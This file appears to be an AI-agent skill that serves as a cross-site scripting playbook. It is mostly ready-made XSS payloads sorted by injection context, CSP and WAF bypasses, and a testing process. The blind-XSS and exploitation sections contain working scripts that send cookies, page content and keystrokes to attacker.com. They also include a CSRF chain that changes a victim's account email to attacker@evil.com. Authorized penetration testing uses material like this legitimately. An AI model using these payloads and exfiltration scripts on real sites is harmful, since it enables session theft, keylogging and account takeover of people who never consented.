---
name: xss-cross-site-scripting
description: >-
  XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths.
---

# SKILL: Cross-Site Scripting (XSS)

## 0. QUICK CONTEXT PICKS

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body (title/textarea) | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace |

---

## 1. INJECTION CONTEXT MATRIX

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Block tag | `<title>INPUT</title>` | Close tag | `</title><svg onload=alert(1)>` |
| href / src | link or form | Protocol | `javascript:alert(1)` |
| JS string (single) | `var x='INPUT'` | Break string | `'-alert(1)-'` |
| JS string (escaped) | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |

---

## 2. MULTI-REFLECTION

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED VECTORS

```html
<!-- DOM Insert (innerHTML, document.write, $.html) -->
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>

<!-- PHP_SELF path injection -->
https://target.com/page.php/"><svg onload=alert(1)>?param=val

<!-- File upload: filename -->
"><svg onload=alert(1)>.gif

<!-- SVG upload (stored XSS) -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

<!-- EXIF injection -->
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg

<!-- postMessage (no origin check) -->
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">

<!-- XML context -->
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
```

---

## 4. CSP BYPASS

```html
<!-- JSONP on allow-listed domain -->
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>

<!-- AngularJS CDN (ajax.googleapis.com allow-listed) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>

<!-- base-uri missing -->
<base href="https://attacker.com/">

<!-- Angular CSTI -->
{{constructor.constructor('alert(1)')()}}
```

---

## 5. FILTER / WAF BYPASS

```
# Tag mutation:
<ScRipt>      (case)
<svg/onload=  (slash instead of space)
<%00iframe    (null byte)

# Encoding:
%253C         (double-encoded <)
%26lt;        (HTML entity double-encoding)

# Fragmented (strip-tags bypass):
"o<x>nmouseover=alert<x>(1)//

# Without event handlers:
<form action=javascript:alert(1)><input type=submit>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
```

---

## 6. SECOND-ORDER XSS

Input stored encoded, retrieved and rendered without re-encoding.

```
&lt;svg/onload&equals;alert(1)&gt;
```

Check: profile fields, display names, forum posts → admin panel rendering.

---

## 7. BLIND XSS

```html
<!-- Payload (contact forms, user-agent, registration fields) -->
"><script src=//attacker.com/bxss.js></script>
```

```javascript
// bxss.js collector
var d = document;
fetch('https://attacker.com/collect?'+encodeURIComponent(
    'URL:'+d.URL+'\nCOOKIE:'+d.cookie+'\nDOM:'+d.documentElement.innerHTML
));
```

---

## 8. EXPLOITATION CHAINS

```javascript
// Cookie steal
fetch('//attacker.com/?c='+document.cookie)

// Keylogger
document.onkeypress = e => fetch('//attacker.com/k?k='+encodeURIComponent(e.key));

// CSRF via XSS (read CSRF token then POST)
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false); r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

---

## 9. DECISION TREE

```
XSS entry point
|
+-- Reflected? → identify context → context payload
|   Blocked? → try encoding/case mutation/fragmentation
|
+-- Stored? → inject blind XSS payload
|
+-- DOM sink? → check innerHTML/eval/document.write/location.href
|
+-- CSP present?
    +-- JSONP on allow-listed domain?
    +-- AngularJS on CDN allow-list?
    +-- base-uri missing? → <base> injection
    +-- unsafe-eval/unsafe-inline?
```

---

## 10. ZSEANO TESTING PROCESS

1. Test non-malicious tags: `<h2>`, `<img>`, `<table>` — reflected raw?
2. Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`)
3. Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`
4. If filtering `<script>` but not `<script `: `<script src=//attacker.com?c=`
5. Blacklist: does `<svg>` work? `<ScRiPt>`?
6. **Same filter exists elsewhere** — chase across entire application
